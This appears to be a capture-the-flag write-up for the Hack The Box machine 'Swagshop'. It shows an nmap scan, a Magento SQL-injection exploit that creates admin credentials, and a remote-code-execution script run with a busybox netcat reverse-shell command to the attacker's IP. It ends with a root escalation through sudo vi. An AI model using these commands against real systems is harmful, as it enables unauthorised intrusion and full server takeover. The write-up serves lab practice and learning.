
### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgTCefp89MPJm2oaJqietdslSBur+eCMVQRW19iUL2DQSdZrIctssf/ws4HWN9DuXWB1p7OR9GWQhjeFv+xdb8OLy6EQ72zQOk+cNU9ANi72FZIkpD5A5vHUyhhUSUcnn6hwWMWW4dp6BFVxczAiutSWBVIm2YLmcqwOEOJhfXLVvsVqu8KUmybJQWFaJIeLVHzVgrF1623ekDXMwT7Ktq49RkmqGGE+e4pRy5pWlL2BPVcrSv9nMRDkJTXuoGQ53CRcp9VVi2V7flxTd6547oSPck1N+71Xj/x17sMBDNfwik/Wj3YLjHImAlHNZtSKVUT9Ifqwm973YRV9qtqtGT
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEG18M3bq7HSiI8XlKW9ptWiwOvrIlftuWzPEmynfU6LN26hP/qMJModcHS+idmLoRmZnC5Og9sj5THIf0ZtxPY=
|   256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINmmpsnVsVEZ9KB16eRdxpe75vnX8B/AZMmhrN2i4ES7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
 In main page we see `Mageto` which have sqli could lead to rce using https://www.exploit-db.com/exploits/37977 need to use http://swagshop.htb/index.php/ as target
 ```
 ┌──(kali㉿kali)-[~/HTB/Swagshop]
└─$ python2 exp.py 
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme

 ```
And we use this to get shell https://www.exploit-db.com/exploits/37811 but  it old we using this https://github.com/Hackhoven/Magento-RCE.git. Cuz it has different dir when we use domain name we need raw ip to read the file
```
┌──(kali㉿kali)-[~/HTB/Swagshop]
└─$ curl -s 10.129.229.138/app/etc/local.xml | grep date
            <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>

```
 Let exploit
 ```
 ┌──(kali㉿kali)-[~/HTB/Swagshop]
└─$ python3 rce.py http://swagshop.htb/index.php/admin/ 'busybox nc 10.10.17.47 443 -e /bin/sh'                                        
Form name: None
Control name: form_key
Control name: login[username]
Control name: dummy
Control name: login[password]
Control name: None

┌──(kali㉿kali)-[~/HTB/Swagshop]
└─$ penelope --oscp-safe --no-log -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => swagshop 10.129.229.138 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@swagshop:/var/www/html$ 

 ```

### Priv escalation
```
www-data@swagshop:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/*
24 files to edit

# id
uid=0(root) gid=0(root) groups=0(root)
# 

```
### Post exploit